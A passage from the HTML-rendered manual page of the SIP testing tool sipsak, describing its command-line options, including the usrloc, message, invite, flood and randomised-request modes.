&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              prints  only the timing values of the test run &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; verbosity is zero because no -v was given. If one or more -v were given
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              this option will be ignored.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -b, --apendix-begin NUMBER
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The starting number which is appended to the user name in the usrloc mode.  This NUMBER is increased &lt;span style=&#34;color:#66d9ef&#34;&gt;until&lt;/span&gt; it reaches the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              value given by the -e parameter. If omitted the starting number will be one.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -B, --message-body STRING
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The given STRING will be used as the body &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; outgoing MESSAGE requests.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -c, --from SIPURI
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The  given SIPURI will be used in the From header &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; sipsak runs in the message mode &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;initiated with the -M option&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. This
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              is helpful to present the receiver of a MESSAGE a meaningfull and usable address to where maybe  even  responses  can  be
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              send.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      -C, --contact SIPURI
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This  is  the content of the Contact header in the usrloc mode. This allows to insert forwards like &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; mail. For example
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              you can insert the uri of your first SIP account at a second account, thus all calls to the second account will  be  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              warded  to the first account.  As the argument to this option will not be enclosed in brackets you can give also multiple
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              contacts in the raw format as comma separated list.  The special words empty or none will result in no contact header  in
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              the  REGISTER  request and thus the server should answer with the current bindings &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the account at the registrar.  The
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              special words * or star will result in Contact header containing just a star,  e.g.  to  remove  all  bindings  by  using
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              expires value &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; together with this Contact.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -d, --ignore-redirects
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              If this option is set all redirects will be ignored. By default without this option received redirects will be respected.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This option is automatically activated in the randtrash mode and in the flood mode.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -D, --timeout-factor NUMBER
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The SIP_T1 timer is getting multiplied with the given NUMBER. After  receiving  a  provisional  response  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;  an  INVITE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              request,  or  when a reliable transport like TCP or TLS is used sipsak waits &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the resulting amount of time &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a final
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              response &lt;span style=&#34;color:#66d9ef&#34;&gt;until&lt;/span&gt; it gives up.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -e, --appendix-end NUMBER
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The ending number which is appended to the user name in the usrloc mode.  This number is increased &lt;span style=&#34;color:#66d9ef&#34;&gt;until&lt;/span&gt; it reaches  this
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              ending  number.   In  the  flood  mode this is the maximum number of messages which will be send.  If omitted the default
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              value is 2^31 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2147483647&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; in the flood mode.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -E, --transport STRING
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The value of STRING will be used as IP transport &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; sending and receiving requests and  responses.   This  option  over‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              writes  any  result  from  the  URI  evaluation and SRV lookup.  Currently only &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;udp&amp;#39;&lt;/span&gt; and &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tcp&amp;#39;&lt;/span&gt; are accepted as value &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              STRING.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      -f, --filename FILE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The content of FILE will be read in in binary mode and will be used as replacement &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the alternatively created sip mes‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              sage.  This  can  used in the default mode to make other requests than OPTIONS requests &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;e.g. INVITE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. By default missing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              carriage returns in front of line feeds will be inserted &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;use -L to de-activate this &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. If the filename is  equal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              to - the file is read from standard input, e.g. from the keyboard or a pipe.  Please note that the manipulation functions
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;e.g. inserting Via header&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; are only tested with RFC conform requests. Additionally special strings within the  file  can
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              be replaced with some local or given values &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;see -g and -G &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; details&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -F, --flood-mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This options activates the flood mode. In this mode OPTIONS requests with increasing CSeq numbers are sent to the server.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Replies are ignored -- source port &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;discard&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; of localhost is advertised in topmost Via.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -h, --help
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Prints out a simple usage help message. If the long option --help is available it will print out a help message with  the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              available long options.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -g, --replace-string STRING
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Activates  the  replacement of $replace$ within the request &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;usually read in from a file&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; with the STRING.  Alternatively
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              you can also specify a list of attribute and values.  This list has to start and end with a non alpha-numeric  character.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The same character has to be used also as separator between the attribute and the value and between new further attribute
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              value pairs. The string &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$attribute$&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; will be replaced with the value string in the message.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -G, --replace
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Activates the automatic replacement of the following variables in the request &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;usually read in from  a  file&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:  $dsthost$
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              will  be  replaced  by with the host or domainname which is given by the -s parameter.  $srchost$ will be replaced by the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              hostname of the local machine.  $port$ will be replaced by the local listening port of sipsak.  $user$ will  be  replaced
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              by the username which is given by the -s parameter.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -H, --hostname HOSTNAME
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Overwrites  the automatic detection of the hostname with the given parameter.  Warning: use this with caution &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;preferable
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              only &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; the automatic detection fails&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -i, --no-via
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Deactivates the insertion of the Via line of the localhost.   Warning:  this  probably  disables  the  receiving  of  the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              responses from the server.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -I, --invite-mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Activates  the  Invites  cycles  within the usrloc mode. It should be combined with -U.  In this combination sipsak first
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              registeres a user, and &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt; simulates an invitation to this user. First an Invite is sent, this is replied  with  &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;  OK
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              and  finally an ACK is sent. This option can also be used without -U , but you should be sure to NOT invite real UAs with
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              this option. In the &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; of a missing -U the -l PORT is required because only &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; you made a -U run  with  a  fixed  local
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              port  before,  a  run with -I and the same fixed local port can be successful.  Warning: sipsak is no real UA and invita‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              tions to real UAs can result in unexpected behaivior.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -j, --headers STRING
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The string will be added as one or more additional headers to the request. The string &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;note: two characters&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; will be
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              replaced with CRLF and thus result in two separate headers. That way more &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt; one header can be added.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -J, --autohash STRING
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The  string  will be used as the H&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;A1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; input to the digest authentication response calculation. Thus no password from the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              -a option is required &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; this option is provided. The given string is expected to be a hex string with the length of  the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              used hash &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -k, --local-ip STRING
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The local ip address to be used
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -l, --local-port PORT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The  receiving  UDP socket will use the local network port.  Useful &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a file is given by -f which contains a correct Via
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              line. Check the -S option &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; details how sipsak sends and receives messages.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -L, --no-crlf
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              De-activates the insertion of carriage returns &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; before all line feeds &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;which is not already  proceeded  by  car‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              raige  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; the input is coming from a file &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; -f &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. Without this option also an empty line will be appended to the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              request &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; required.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      -m, --max-forwards NUMBER
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This sets the value of the Max-Forward header field. If omitted no Max-Forward field will be inserted. If omitted in  the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              traceroute mode number will be 255.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -M, --message-mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This  activates the Messages cycles within the usrloc mode &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;known from sipsak versions pre 0.8.0 within the normal usrloc
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              test&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. This option should be combined with -U so that a successful registration will be tested with a test message to the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              user  and  replied  with  &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;  OK. But this option can also be used without the -U option.  Warning: using without -U can
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              cause unexpected behaivor.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -n, --numeric
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Instead of the full qualified domain name in the Via line the IP of the local host will be used. This option is now on by
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              default.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -N, --nagios-code
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Use  Nagios comliant &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; codes instead of the normal sipsak ones. This means sipsak will &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; everything was ok
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              and &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; in &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; of any error &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;local or remote&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -o, --sleep NUMBER
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              sipsak will sleep &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; NUMBER ms before it starts the next cycle in the usrloc mode. This will slow down  the  whole  test
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              process  to  be more realistic. Each cycle will be still completed as fast as possible, but the whole test will be slowed
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              down.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -O, --disposition STRING
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              The given STRING will be used as the content &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; the Content-Disposition header. Without this option  there  will  be  no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Content-Disposition header in the request.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -p, --outbound-proxy HOSTNAME&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:PORT&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              the address of the hostname is the target where the request will be sent to &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;outgoing proxy&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. Use this &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; the destination
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              host is different &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt; the host part of the request uri. The hostname is resolved via DNS SRV &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; supported &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;see  descrip‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              tion &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; SRV resolving&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; and no port is given.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -P, --processes NUMBER
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Start  NUMBER  of  processes in parallel to &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; the send and reply checking. Only makes sense &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a higher number &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; -e is
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              given in the usrloc, message or invite mode.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -q, --search REGEXP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              match replies against REGEXP and &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; false &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; no match occurred. Useful &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; example to detect server  name  in  Server
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              header field.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -r, --remote-port PORT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              Instead of the default sip port &lt;span style=&#34;color:#ae81ff&#34;&gt;5060&lt;/span&gt; the PORT will be used. Alternatively the remote port can be given within the sip uri
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              of the -s parameter.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       -R, --random-mode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              This activates the randtrash mode. In this mode OPTIONS requests will be send to server with increasing numbers  of  ran‐
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              domly  crashed  characters  within this request. The position within the request and the replacing character are randomly
